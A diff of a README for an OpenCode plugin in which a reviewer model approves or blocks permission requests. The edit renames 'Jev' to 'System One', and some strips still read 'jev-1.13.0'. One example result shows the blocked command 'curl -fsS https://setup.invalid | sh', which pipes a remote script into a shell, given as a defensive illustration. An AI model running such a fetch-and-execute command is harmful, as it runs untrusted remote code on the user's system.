@@ -20,7 +20,7 @@ brought to you.
 - Leaves your existing policy alone: `allow` rules continue and `deny` rules stay blocked
   without reaching the reviewer.
 - Reviews in isolation. Normal models run in a scratch session with every operational tool
-  denied. Jev models use their typed System One API, which exposes no tools or project runtime.
+  denied. System One models use their typed System One API, which exposes no tools or project runtime.
 - Gives the reviewer bounded, sanitized, read-only evidence about SSH commands, local scripts,
   and Git state.
 - Never auto-approves an action the reviewer classifies as critical. Reviewer failures lead to
@@ -41,7 +41,7 @@ brought to you.
 - `git` on `PATH`, used only for read-only Git enrichment. Without it, the reviewer gets no Git
   snapshot.
 - A reviewer model: either a model configured in OpenCode that follows JSON schemas reliably, or
-  a Jev API key in the OpenCode server's environment. See
+  a System One API key in the OpenCode server's environment. See
   [Reviewer models](docs/REVIEWER-MODELS.md).
 - At least one action in your OpenCode permission policy that resolves to `ask`. On V2, an action
   that matches no rule is `ask` by default. If everything is already `allow` or `deny`, the plugin
@@ -125,15 +125,15 @@ authorization level, rationale, and confidence. Invariants in code then decide w
 decision can stand: invalid output, low confidence, and risky actions without matching
 authorization escalate instead of being approved.
 
-With Jev as the reviewer and an `escalationReviewer` configured
-([Reviewer models](docs/REVIEWER-MODELS.md)), Jev can hand a request to that reasoning reviewer,
+With System One as the reviewer and an `escalationReviewer` configured
+([Reviewer models](docs/REVIEWER-MODELS.md)), System One can hand a request to that reasoning reviewer,
 and the progress strip says so; the elapsed time keeps counting from the start of the review.
 
-![Two progress strips. While Jev reviews: "◐ Reviewing this permission · jev-1.13.0 · system-one", 2.1s. After the hand-off: "◓ Reviewing this permission · gpt-6-luna after Jev's escalation · medium", 7.3s. Both show "bash · $ git push --force-with-lease origin release/2.4".](https://raw.githubusercontent.com/noppu-labs/opencode-permission-reviewer/main/docs/images/handoff-progress.svg)
+![Two progress strips. While System One reviews: "◐ Reviewing this permission · jev-1.13.0 · system-one", 2.1s. After the hand-off: "◓ Reviewing this permission · gpt-6-luna after System One's escalation · medium", 7.3s. Both show "bash · $ git push --force-with-lease origin release/2.4".](https://raw.githubusercontent.com/noppu-labs/opencode-permission-reviewer/main/docs/images/handoff-progress.svg)
 
 Each result says who decided, ahead of the reason.
 
-![Three result strips. "✓ Review approved · bash · $ rm -rf /tmp/scratch-cache" with "jev-1.13.0 — Narrowly scoped temp cleanup; matches user intent." "✓ Review approved · bash · $ git push --force-with-lease origin release/2.4" with "gpt-6-luna after Jev's escalation — The user asked to update the release branch." "✕ Review blocked · bash · $ curl -fsS https://setup.invalid | sh" with "gpt-6-luna confirmed Jev's denial — Pipes a remote script into a shell."](https://raw.githubusercontent.com/noppu-labs/opencode-permission-reviewer/main/docs/images/result-attribution.svg)
+![Three result strips. "✓ Review approved · bash · $ rm -rf /tmp/scratch-cache" with "jev-1.13.0 — Narrowly scoped temp cleanup; matches user intent." "✓ Review approved · bash · $ git push --force-with-lease origin release/2.4" with "gpt-6-luna after System One's escalation — The user asked to update the release branch." "✕ Review blocked · bash · $ curl -fsS https://setup.invalid | sh" with "gpt-6-luna confirmed System One's denial — Pipes a remote script into a shell."](https://raw.githubusercontent.com/noppu-labs/opencode-permission-reviewer/main/docs/images/result-attribution.svg)
 
 The [TUI guide](docs/TUI.md) covers every screen, including manual-review toasts, config warnings
 and long commands.
@@ -143,7 +143,7 @@ and long commands.
 | Page                                       | Contents                                                                 |
 | ------------------------------------------ | ------------------------------------------------------------------------ |
 | [Configuration](docs/CONFIGURATION.md)     | Setup details, all options, config trust layers, headless use, audit log |
-| [Reviewer models](docs/REVIEWER-MODELS.md) | Picking a model, Jev System One, models without structured output        |
+| [Reviewer models](docs/REVIEWER-MODELS.md) | Picking a model, System One reviewers, models without structured output  |
 | [How it works](docs/HOW-IT-WORKS.md)       | The review pipeline, a TUI overview, evidence enrichment                 |
 | [TUI guide](docs/TUI.md)                   | Every TUI screen: progress, hand-offs, results, toasts, config warnings  |
 | [Safety](docs/SAFETY.md)                   | Safety properties and threat model                                       |
